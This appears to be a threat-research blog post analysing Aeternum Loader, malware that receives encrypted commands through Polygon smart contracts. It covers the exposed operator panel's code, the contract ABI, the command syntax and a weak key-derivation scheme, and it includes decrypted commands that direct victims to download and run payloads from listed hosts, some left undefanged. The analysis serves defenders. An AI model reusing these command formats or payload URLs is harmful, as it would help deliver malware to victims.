---
title: "Aeternum Loader: When your C2 lives forever"
classes: wide
header:
  teaser: /assets/images/block/logo1.png
ribbon: black
description: "An exposed operator panel revealed how Aeternum Loader abuses Polygon smart contracts for C2, allowing us to view all C2 commands ever sent." 
categories:
  - Threat Research
tags:
  - Threat Research
toc: true
---

# Aeternum C2 BotNet Loader

In a recent CtrlAltIntel investigation into [ErrTraffic](https://ctrlaltintel.com/threat%20research/ErrTraffic/), we spotted ads for “Aeternum C2 BotNet Loader” - a loader whose operators publish commands to Polygon smart contracts instead of a traditional C2 server. That design removes the need for attacker-owned public infrastructure, but it also makes command traffic globally observable on-chain.

In this post we:

* Show how an exposed operator panel revealed the full contract/crypto implementation
* Break down the smart contract ABI and C2 command format 
* Explain and exploit core weaknesses in order to decrypt all Aeternum loader commands

## Getting the Panel

We mentioned that you don't **need** to configure the C2 server panel to be public facing, and actually, it's a very bad idea to do this. The C2 panel is implemented as a `Next.js` web application, which we found one exposed on `hXXp://23.94.145[.]192:3000/`:

[![1](/assets/images/block/1.png)](/assets/images/block/1.png){: .full}  

After we found this (initially on Censys <3), we checked the source-code to discover the Polygon smart-contract & C2 source-code was exposed publicly:

[![1](/assets/images/block/2.png)](/assets/images/block/2.png){: .full}  

This REALLY helped understand how the C2 protocol worked, as at this point in time we didn't have a build, and the build itself was hard (for me) to reverse. 

We do think it's cool how the C2 over blockchain worked, so we want to take the time to break down the surrounding concepts. 

# Command, Control & Crypto (C3)

Looking at the JavaScript source it was clear C2 commands were sent to victims via a Polygon "smart contract". Think of a smart contract as a tiny program that lives forever on the internet, hosted by nobody and everyone at once. It's stored across a decentralised network of thousands of computers (the Polygon blockchain network). Once deployed, it cannot be deleted or shut down. The program will exist forever at a specific address like `0x7A3B...9F3d`. 

The panel will also allow operators to deploy smart contracts to the Polygon blockchain. These smart contracts contain a function which is called by the malware, via the Polygon RPC, that will return the encrypted command that is decrypted and ran on victim machines. 

## Unlocking the panel

When you first view the panel, you'll be asked for a Polygon private key and told "Your key will be encrypted with AES-256-GCM". 

[![1](/assets/images/block/3.png)](/assets/images/block/3.png){: .full}  

We can validate this is the case, although it is just encrypted and stored with the browsers local storage. At no point does the private key leave the browser!

```js
static async encryptPrivateKey(e, a) {              
    try {
        let t = new TextEncoder().encode(e),
            s = new Uint8Array(16),
            r = localStorage.getItem(this.SALT_KEY + "_" + a);
        r ? s = new Uint8Array(JSON.parse(r)) : (crypto.getRandomValues(s), localStorage.setItem(this.SALT_KEY + "_" + a, JSON.stringify(Array.from(s))));
        let c = navigator.userAgent + navigator.language + screen.colorDepth,  // "Unique" user identifier
            l = await this.deriveKey(a + c, s),                                // AES key derived using the above "Unique" user identifier 
            n = new Uint8Array(12);
        crypto.getRandomValues(n);
        let o = await crypto.subtle.encrypt({
                name: "AES-GCM",
                iv: n
            }, l, t),
            i = {
                iv: Array.from(n),
                data: Array.from(new Uint8Array(o))
            };
        localStorage.setItem(this.STORAGE_KEY + "_" + a, JSON.stringify(i))   // Stored locally 
//[...REDACTED...]
```

This `encryptPrivateKey()` function is later called after the user provides their private key, and the Ethers.js library is used to create a new wallet, derive public addresses and check whether the provided keys were valid. 

```js
let tg = async () => {
    if (!em) return p.oR.error("Enter key");  // User input, em = private key
    ex(!0);
    try {
        eY.setEncryptionKey(em);         
        let e = new i.FR(en),               // RPC provider, en = https://polygon-rpc.com (or some other)
            a = new x.u(em, e),            // New wallet created using Ethers.js x.u = Wallet() 
            t = await a.getAddress();      // Derive public address from private key 

        await R.encryptPrivateKey(em, t), M(t), U(!0), await tm(t);  // Encrypt private key 
        let s = (await e.getNetwork()).chainId.toString(16);          // Attempt to use private key to connect 
        P("0x".concat(s)), ef(""), ed(!1), p.oR.success("Connected securely")
    } catch (e) {
        console.error("Connection error:", e), p.oR.error("Invalid key")
    } finally {
        ex(!1)
    }
}
```

If successful, you unlock the panel where you can see the features and gain further insight than just reading the source:

<center>
<video width="1080" height="720" controls="controls">
<source src="/assets/images/block/4.mp4" type="video/mp4">
</video>
</center>

## Smart Contract Analysis

We mentioned earlier that smart contracts are programs that live on the internet. Like all programs, smart contracts are also written in programming languages. [Solidity](https://www.soliditylang.org/) is a programming language used for developing smart contracts that run on Polygon. 

Within the JavaScript we saw Solidity compiled bytecode for the smart contract to run on Ethereum Virtual Machine (EVM), which has been uploaded to [our Github](https://github.com/ctrlaltint3l/intelligence/blob/main/Aeternum%20Loader/Smartcontract_Bytecode): 

[![1](/assets/images/block/6.png)](/assets/images/block/6.png){: .full}  

To create a smart contract, the function `u.P()` maps to `ethers.ContractFactory()`. This takes in an ABI, the bytecode and a signer (derived from user submitted private key) to create a ContractFactory object stored as the variable `s`, which is used to deploy this contract using `s.deploy()`.   

As bytecode is not readable, an Application Binary Interface (ABI) is used to expose the low-level smart contract's functions and make them accessible from a high-level programming language like JavaScript. We can find this hardcoded within the source exposing the functionality of smart contract:

[![1](/assets/images/block/5.png)](/assets/images/block/5.png){: .full}  

1. Constructor - defines a required initialisation string, `initialDomain`. This is actually an encrypted C2 command 
2. Event - `DomainUpdated`, the contract logs every change to the stored string (encrypted C2 command)
3. Read-only function - `admin()`, the contract has a single privileged address which is publicly readable
4. Read-only function - `getDomain()`, the contract stores one string value which is publicly readable (encrypted C2 command)
5. State-changing function - `updateDomain()`, allows operator to replace stored string (encrypted C2 command)

### Commands

The C2 commands decrypted have 2 main flags, `all` or `hwid`. If the flag command is `all`, Aeternum loader will proceed running the command regardless. If `hwid`, it'll only run if the provided `hwid` value matches a unique host ID generated by taking the MD5 hash of the `C:`-drive serial number. 

* `all` - run on all endpoints
* `hwid` - run on specific endpoint

All C2 commands will contain a URL which will host the payload Aeternum Loader will download. There are options for command-line arguments, establishing persistence and making "ping" checks via HTTP requests. 

* `hwid:fca8bdd1134497619285f4f9aba60817:url:<URL>` - Execute payload on URL on specific host

* `all:url:<URL>` - Execute payload on URL

* `all:args:<ARGS>:url:<URL>` - Execute payload on URL

* `all:savestartupname:<NAME>:url:<URL>` - Execute payload on URL + establish persistence

* `all:savestartupname:<NAME>:args:<ARGS>:url:<URL>` - Execute payload on URL w. command-line arguments + establish persistence

* `all:ping:url:<URL>` - Make call-back HTTP request to get IPs

Aeternum Loader will decrypt and parse these C2 commands, initially checking for `all` or `hwid` flags. The file extension of the file within the URL is used to decide what "path" to take within the malware execution pattern. Aeternum Loader will reflectively load all DLLs within memory, with other file extensions being written to disk. 

#### Decryption

The C2 commands (e.g. `all:ping:url:<URL>`) are stored on the Blockchain encrypted. From the panel source, C2 commands are sent to the blockchain stored AES-GCM encrypted, with a PBKDF2 key derived from the contract address:

```js
static async deriveKey(e, a) {
let t = new TextEncoder().encode(e),
    s = await crypto.subtle.importKey("raw", t, "PBKDF2", !1, ["deriveKey"]);
return crypto.subtle.deriveKey({
    name: "PBKDF2",
    salt: a.buffer,
    iterations: 1e5,
    hash: "SHA-256"
}, s, {
    name: "AES-GCM",
    length: 256
}, !1, ["encrypt", "decrypt"])
}  
```

The format of encrypted C2 commands are as follows. The key is derived using a PBKDF2 algorithm with both the **salt** AND & **password** set to the contract address: 

```
AES key = PBKDF2( 100,000 iterations + salt & password = lowercase(contract_address) )

hex(base64(IV):base64(AES encrypted data))  
```

This means, from the contract address alone, it's possible to completely decrypt all commands that have been sent to that particular C2 channel. 

# Blockchain Analysis

In the [second blog](), we reverse a build of Aeternum Loader - directly from `LenAI` themselves, eventually extracting the contract address `0x4d70C3393C5d9EC325Edf8b3f289cFA9777e64B0`. We can use Polygon scan to view the 13 transactions surrounding this smart contract:

[![1](/assets/images/block/41.png)](/assets/images/block/41.png){: .full}  

Each transaction corresponds to a "Update Domain" event, which are triggered when the `updateDomain()` function is called. All of these were associated with the contracts creator, `0xcaf2c54e400437da717cf215181b170f65187abf`. This is the Polygon address used by `LenAI`. Looking on the "events" tab we can see a historical log of all C2 commands for this specific smart contract:

[![1](/assets/images/block/42.png)](/assets/images/block/42.png){: .full}  

Each of these are AES-GCM encrypted with a key that is derived from the contract address. We can decode each of these commands to plaintext using this [decryption algorithm](https://github.com/ctrlaltint3l/intelligence/blob/main/Aeternum%20Loader/aeternum_c2_command_decrypt.py):

[![1](/assets/images/block/45.png)](/assets/images/block/45.png){: .full}  

## Pivoting 

We've identified 1 smart contract, `0x4d70C3393C5d9EC325Edf8b3f289cFA9777e64B0`, that has insecure encryption implementation that could allow dumping of all plaintext commands ever sent to the C2. If we can identify additional smart contracts on the blockchain, that share identical bytecode - they could also be malicious and storing C2 commands.

On 13/02/2026, Polygonscan displayed 400 addresses hosting this identical smart contract bytecode:   

[![1](/assets/images/block/46.png)](/assets/images/block/46.png){: .full}  

Each of these could potentially be malicious and be abused, although checking manually is tiresome, and most of the contract addresses have no activity. We can leverage [Etherscan.io](https://etherscan.io/apis)'s free API to automate pulling the event logs for each address (I was able to extract 394). We can also attempt to manually decrypt using the insecure encryption implementation we identified.

### Decrypting TA comms :)

Currently, we have a list of **394** smart contract addresses that contain identical bytecode. We've seen 1 case where this has been abused. In order to scale up analysis, we can attempt to retrieve the following information from each of these addresses:

* Address of smart contract creator - Use Etherscan API function `getcontractcreation` from module `contract` 
* Timestamped event log - Use Etherscan API function `getLogs` from module `logs`

Whenever using the Etherscan API, we have to specify the relevant chainid for Polygon mainnet - `137`.

Provide an Etherscan API key (free works fine), and either a contract address or list of them, using this [C2 dumper script](https://raw.githubusercontent.com/ctrlaltint3l/intelligence/refs/heads/main/Aeternum%20Loader/dump_blockchain_c2.py) to automatically attempt to dump the logs:

> `python dump_blockchain_c2.py --api-key [ETHER] --contracts-file contract_addresses.txt`

[![1](/assets/images/block/50.png)](/assets/images/block/50.png){: .full}  

Not all data is following the same AES-GCM encryption scheme we observed. Some are just URLs in plaintext (we'll get to these) and other examples use a different encoding or encryption scheme altogether. From Polygonscan I extracted a list of **394** smart contract addresses, only **81** had logs. 

Additionally, only of these **37** contracts could be decrypted using the AES-GCM algorithm. These are **37** individual Aeternum Loader C2 channels that have commands exposed. From these **37** C2 channels, we could successfully decode **209** plaintext C2 commands sent from 2025-10-26 to 2026-02-12. 

Many of these commands relate to testing or grabbing IPs via the `ping` functionality, but we also saw attempts to deploy malware:

* `all:url:hXXps://github[.]com/caldop/test/raw/refs/heads/main/Logs.exe`
* `all:url:hXXps://l.station307[.]com/7JjDE5knnozgYoubgCLxsk/rat1411empty.exe` 
* `hwid:fda3522fa3994a2c:url:https://github.com/caldop/test/raw/refs/heads/main/rat1411empty.exe`
* `hwid:fda3522fa3994a2c:url:https://l.station307.com/J12VDRxm1rpS2SPZwmoSK8/Logs.exe`

We wanted to investigate the creators of the smart contract. These could potentially be threat actors who have bought Aeternum Loader, or `LenAI` themselves. The creator address belonging to `LenAI`, `0xcaf2c54e400437da717cf215181b170f65187abf`, was actually the most prolific creator - successfully deploying **32** contracts and sending **94** commands. Other addresses may also be `LenAI` - it's just the `0xcaf2...7abf` is the only confirmed case so far from the malware they gave us.   

**All Contract Creators**

| Creator Address | Contracts Deployed | Total TXs Sent |
|-----------------|-------------------|----------------|
| 0xcaf2c54e400437da717cf215181b170f65187abf | 32 | 94 |
| 0x6e3c232c3c61dfce05e677cc351b3d0d677ee49b | 22 | 34 |
| 0x610676ee857fcab6e6a8631a8867173b4c88350a | 8 | 46 |
| 0x2a4ff9e51bce71608106f10fce030f092e427ba2 | 4 | 21 |
| 0x000000000000f734e8782606855a209b421dafd6 | 3 | 6 |
| 0xbe372a40ea19db6f4641963b4741b1ff6a0de734 | 3 | 3 |
| 0xbe42e390c0701eff421e6d77ab89aa503831e8ac | 2 | 11 |
| 0x48acf8b2aaa35762df1ce49c562fa1914d833114 | 1 | 2 |
| 0xe46de816cf8c5b8c39f0332b1968a5d8cbace6a1 | 1 | 5 |
| 0x97b00151b02c361b6179de6618dbda43838aedcc | 1 | 1 |
| 0x460597a2fd0cd963f3c0575ff44f1c14bc59839c | 1 | 1 |
| 0x7d4f1154be8471e324e7dbd8c16254618042f6df | 1 | 3 |
| 0x1e34686a32cc2a9719418cb2b26233f61330d693 | 1 | 8 |
| 0xb0e2a3f37c6abc102678c0677dbe9c36cb79e0b1 | 1 | 1 |


The second most active address, [0x6e3c...e49b](https://polygonscan.com/address/0x6e3c232c3c61dfce05e677cc351b3d0d677ee49b), funded by [0x8f22...a3e6](https://polygonscan.com/tx/0x8f22e2ef97305633ac460bffd4f642f5818fd97d969983447d4433491c3ea3e6) on 2025-12-06, created 22 smart contracts from 2025-12-06 11:52:09AM -  11:54:57AM. Looking at the command-log, encrypted commands were sent from 2025-12-06 12:14:15 UTC to 14:46:29 UTC - using an unknown encryption scheme (waiting to be cracked, have fun!):

[![1](/assets/images/block/51.png)](/assets/images/block/51.png){: .full}  

**Active Smart Contracts**

| Smart Contract Address                      | Smart Contract Creator       | Total commands |
| :----------------------------------------- | :----------------------------------------- | ---------: |
| 0x8736e656bf7f5fae350be94b4735b33bbd6ef9f4 | 0x610676ee857fcab6e6a8631a8867173b4c88350a |         32 |
| 0xcace1c6c420c26702a06cc8e93179b6efa3cd9b9 | 0xcaf2c54e400437da717cf215181b170f65187abf |         11 |
| 0x04e25a563f159308fc3e15fe9ccc9d2cf623d0cc | 0xcaf2c54e400437da717cf215181b170f65187abf |         10 |
| 0x641b255a070b2c12cda1436de5be15aa600632ec | 0x2a4ff9e51bce71608106f10fce030f092e427ba2 |         10 |
| 0x0138d33d8e468b19a7f7ea53604656823274ef42 | 0xbe42e390c0701eff421e6d77ab89aa503831e8ac |         10 |
| 0xf9438b4e3200ae1611ed3d03310c803fddf67672 | 0xcaf2c54e400437da717cf215181b170f65187abf |          9 |
| 0x5310fddefdb7554e9b68eb2c485c950012902d40 | 0x1e34686a32cc2a9719418cb2b26233f61330d693 |          8 |
| 0x281ba06bbe30a90737a456f27ab37543acf160e2 | 0xcaf2c54e400437da717cf215181b170f65187abf |          7 |
| 0xbdd87c6d12a925707a65dd58e28b123f2b03c634 | 0xcaf2c54e400437da717cf215181b170f65187abf |          6 |
| 0x2cbe73f7cc5275931fc08bb695f93abeca95d04e | 0xcaf2c54e400437da717cf215181b170f65187abf |          5 |
| 0x55b4f951d5ac035c21b170c73c0a930a641b718c | 0xcaf2c54e400437da717cf215181b170f65187abf |          5 |
| 0x8d83f7691df76503cc441cf2d5630c3213488170 | 0x2a4ff9e51bce71608106f10fce030f092e427ba2 |          5 |
| 0xd6aec8a39316a4f763c678ef9cb46675bcff4f23 | 0x610676ee857fcab6e6a8631a8867173b4c88350a |          5 |
| 0xd93e4c1d941f0d9cb9332639fb6dc7abd3c601b4 | 0xe46de816cf8c5b8c39f0332b1968a5d8cbace6a1 |          5 |
| 0x2ad62afd7be23754ba6b76b48f6cd3e61d84162e | 0x610676ee857fcab6e6a8631a8867173b4c88350a |          4 |
| 0xdf2e2e7d02d15e67219ebad1cb78e24e738e7d5a | 0xcaf2c54e400437da717cf215181b170f65187abf |          4 |
| 0xf65bf8f7962877279987588c8326bd377b59b5bc | 0x6e3c232c3c61dfce05e677cc351b3d0d677ee49b |          4 |
| 0x198d5e1e6ba539f69dfb43e264c0c69529005c1e | 0x000000000000f734e8782606855a209b421dafd6 |          3 |
| 0x6c02f0501e479b36e89d15b45587593e4eb6c196 | 0xcaf2c54e400437da717cf215181b170f65187abf |          3 |
| 0x87ce037fa45d40d7f9c92752e3f94929c2fed8df | 0x2a4ff9e51bce71608106f10fce030f092e427ba2 |          3 |

The smart contract, [0x8736...f9f4](https://polygonscan.com/address/0x8736e656bf7f5fae350be94b4735b33bbd6ef9f4), has received the most unique commands:

| Timestamp (UTC)           | Unique Command (defanged)                                                                                 |
| ------------------------- | --------------------------------------------------------------------------------------------------------- |
| 2025-12-08T00:23:49+00:00 | all:ping:url:hxxps//iplogger[.]com/2y0QA7                                                                 |
| 2025-12-08T23:33:59+00:00 | all:url:hxxps//iplogger[.]com/2y0QA7                                                                      |
| 2025-12-08T23:44:53+00:00 | all:savestartupname:budilica:args:stet:url:hxxps//github[.]com/pafke123/a/releases/download/z/Build[.]exe |
| 2025-12-09T20:57:46+00:00 | all:ping:url:hxxps//iplogger[.]org/logger/hHTv5FP0H3SI                                                    |
| 2025-12-11T21:25:09+00:00 | all:ping:url:hxxps//grabify[.]link/track/L3H7YV                                                           |
| 2025-12-11T22:40:20+00:00 | all:ping:url:hxxps//grabify[.]link/AW8ALM                                                                 |
| 2025-12-11T22:45:02+00:00 | all:ping:url:hxxps//srturl[.]link/ZVdXL7QEQC                                                              |
| 2025-12-11T22:58:22+00:00 | all:ping:url:hxxps//iplogger[.]com/2X8qY5                                                                 |
| 2025-12-11T23:10:10+00:00 | all:ping:url:hxxps//spoo[.]me/lcFu1F                                                                      |
| 2025-12-11T23:17:58+00:00 | all:ping:url:hxxps//grabify[.]link/4QBX36                                                                 |
| 2025-12-11T23:32:08+00:00 | all:ping:url:hxxps//svejetop[.]link                                                                       |
| 2025-12-12T00:01:10+00:00 | all:ping:url:hxxp//sveje[.]top                                                                            |
| 2025-12-12T12:15:58+00:00 | all:ping:url:hxxps//iplogger[.]com/24UdT8                                                                 |
| 2025-12-12T12:42:00+00:00 | all:ping:url:hxxps//iplogger[.]com/2y0QA7                                                                 |
| 2025-12-12T19:24:59+00:00 | all:ping:url:hxxps//cliip[.]net/xecb1cg8                                                                  |
| 2025-12-13T00:42:00+00:00 | all:url:hxxps//cliip[.]net/xecb1cg8                                                                       |
| 2025-12-15T19:26:07+00:00 | all:url:hxxps//github[.]com/pafke123/aa/raw/d3cd0602a7211e54f59e1b674f6d4fc35e097bc4/limero[.]dll         |
| 2025-12-24T13:09:07+00:00 | all:ping:url:hxxps//iplogger[.]com/24UdT8[.]gif                                                           |
| 2025-12-25T23:21:57+00:00 | all:ping:url:hxxps//iplogger[.]com/24UdT8[.]lnk                                                           |
| 2026-01-04T08:06:37+00:00 | all:ping:url:hxxps//iplogger[.]com/24UdT8[.]pdf                                                           |
| 2026-01-04T08:21:37+00:00 | all:ping:url:hxxps//iplogger[.]com/24UdT8[.]js                                                            |

**ErrTraffic/ClickFix**

Since 31/01/2026, `LenAI`'s Polygon address, [0xcaf2...7abf](https://polygonscan.com/address/0xcaf2c54e400437da717cf215181b170f65187abf), has created over 20 smart contracts that host domains that are used in ErrTraffic/ClickFix campaigns:

[![1](/assets/images/block/65.png)](/assets/images/block/65.png){: .full}  

The ErrTraffic/ClickFix activity is not the subject of this blog, although we wanted to highlight the same smart contract bytecode was used for both. This is because the contract had a "string hosting" function, and it is the threat actors choice if data is encrypted before being uploaded. Notably, we also saw the same Polygon address responsible for creating both contracts for ErrTraffic and Aeternum Loader. This is expected as `LenAI` developed both of these. 

# Conclusion

Aeternum's "C2 over blockchain" is a clever resilience play and also makes nerds like me happy. However, that resilience comes with a tradeoff defenders can exploit. Contracts, transactions and event logs are public, and in Aeternum's case the encryption implementation meant a contract address was enough to reconstruct historical command activity for a particular smart contract. Once a contract is known, researchers can look back historically or monitor for updates in real time. Additionally, we demonstrated how pivoting on contract bytecode can lead to the discovery of more potential C2 targets. 

The hardest part of this research was getting the first contract address. In the [next blog](), we will walk through how we obtained a real Aeternum Loader build, unpacked and reversed it, extracted the embedded Polygon contract address, and validated the on-chain polling + execution chain end-to-end.

# IOCs

We have uploaded the complete dump of commands timestamped to our [Github](https://github.com/ctrlaltint3l/intelligence/blob/main/Aeternum%20Loader/Smart%20Contract%20Log.csv).

| IOC                                                                                | Context                                |
|------------------------------------------------------------------------------------|----------------------------------------|
| mega[.]nz/file/j8wAiL5C#SaSUZoLwnhFxPNWaeInDx0x5Teh2lpGmSMpcdK-b_yI                | Hosting malware ran by Aeternum Loader |
| github[.]com/lencod/lencod/raw/refs/heads/main/Dll2[.]dll                          | Hosting malware ran by Aeternum Loader |
| github[.]com/lencod/lencod/raw/refs/heads/main/putty[.]exe                         | Hosting malware ran by Aeternum Loader |
| github[.]com/ooocyber_sabanoms/puttytest/raw/refs/heads/main/putty[.]exe           | Hosting malware ran by Aeternum Loader |
| clouddefenderai[.]com/7a9c4f2e8b1d6h3g5k0m9n2p4q7r8s1t                             | Hosting malware ran by Aeternum Loader |
| github[.]com/DIGLKAYT/test/raw/refs/heads/main/STEALLER[.]exe                      | Hosting malware ran by Aeternum Loader |
| l[.]station307[.]com/J12VDRxm1rpS2SPZwmoSK8/Logs[.]exe                             | Hosting malware ran by Aeternum Loader |
| github[.]com/caldop/test/raw/refs/heads/main/Logs[.]exe                            | Hosting malware ran by Aeternum Loader |
| github[.]com/caldop/test/raw/refs/heads/main/rat1411empty[.]exe                    | Hosting malware ran by Aeternum Loader |
| l[.]station307[.]com/7JjDE5knnozgYoubgCLxsk/rat1411empty[.]exe                     | Hosting malware ran by Aeternum Loader |
| github[.]com/caldop/test/raw/refs/heads/main/Logs[.]exe                            | Hosting malware ran by Aeternum Loader |
| l[.]station307[.]com/7JjDE5knnozgYoubgCLxsk/rat1411empty[.]exe                     | Hosting malware ran by Aeternum Loader |
| wdfiles[.]ru/2atSW                                                                 | Hosting malware ran by Aeternum Loader |
| github[.]com/pafke123/a/releases/download/z/Build[.]exe                            | Hosting malware ran by Aeternum Loader |
| 155[.]138[.]193[.]225/calc[.]exe                                                   | Hosting malware ran by Aeternum Loader |
| github[.]com/pafke123/aa/raw/d3cd0602a7211e54f59e1b674f6d4fc35e097bc4/limero[.]dll | Hosting malware ran by Aeternum Loader |
| zalupan[.]kozow[.]com:3000/files/zalupan2[.]exe                                    | Hosting malware ran by Aeternum Loader |
| rpc-framework-check[.]cfd/putty[.]exe                                              | Hosting malware ran by Aeternum Loader |
| rpc-framework-check[.]cfd/123[.]exe                                                | Hosting malware ran by Aeternum Loader |
| github[.]com/ooocyber_bunerkdl/ttt/raw/refs/heads/main/123[.]exe                   | Hosting malware ran by Aeternum Loader |
| rpc-framework-check[.]cfd/1[.]ps1                                                  | Hosting malware ran by Aeternum Loader |
| bootstrap-css-framework[.]cfd/                                                     | ClickFix/ErrTraffic related domains    |
| winupdate[.]cfd/                                                                   | ClickFix/ErrTraffic related domains    |
| winupdateconf[.]cfd/                                                               | ClickFix/ErrTraffic related domains    |
| nascdn-js[.]life/                                                                  | ClickFix/ErrTraffic related domains    |
| berlof[.]shop/                                                                     | ClickFix/ErrTraffic related domains    |
| cdn-server-styles[.]cfd/                                                           | ClickFix/ErrTraffic related domains    |
| ferlik[.]shop/                                                                     | ClickFix/ErrTraffic related domains    |
| captcha-cds[.]cfd                                                                  | ClickFix/ErrTraffic related domains    |
| nascdn-js[.]life                                                                   | ClickFix/ErrTraffic related domains    |
| fonts-fontawesome[.]cfd                                                            | ClickFix/ErrTraffic related domains    |
| cloud-safe[.]cfd                                                                   | ClickFix/ErrTraffic related domains    |
| fontawesome-cdn[.]cfd                                                              | ClickFix/ErrTraffic related domains    |
| cdn-clodflare-fotns[.]cfd                                                          | ClickFix/ErrTraffic related domains    |
| sdn-cloudflare-js-botstrup[.]cfd                                                   | ClickFix/ErrTraffic related domains    |
| sdn-cloudflare-js[.]cfd                                                            | ClickFix/ErrTraffic related domains    |
| sdn-cloudflare-js-css[.]cfd                                                        | ClickFix/ErrTraffic related domains    |
| rpc-framework-check[.]cfd                                                          | ClickFix/ErrTraffic related domains    |
| servupdt[.]com                                                                     | ClickFix/ErrTraffic related domains    |
| captcha-cds[.]cfd                                                                  | ClickFix/ErrTraffic related domains    |
| captcha-cds[.]click                                                                | ClickFix/ErrTraffic related domains    |
| sdn-cloudflare-js-css[.]cfd                                                        | ClickFix/ErrTraffic related domains    |
| sdn-cloudflare-js-css[.]click                                                      | ClickFix/ErrTraffic related domains    |
| nascdn-js[.]life                                                                   | ClickFix/ErrTraffic related domains    |
| nascdn-js[.]click                                                                  | ClickFix/ErrTraffic related domains    |
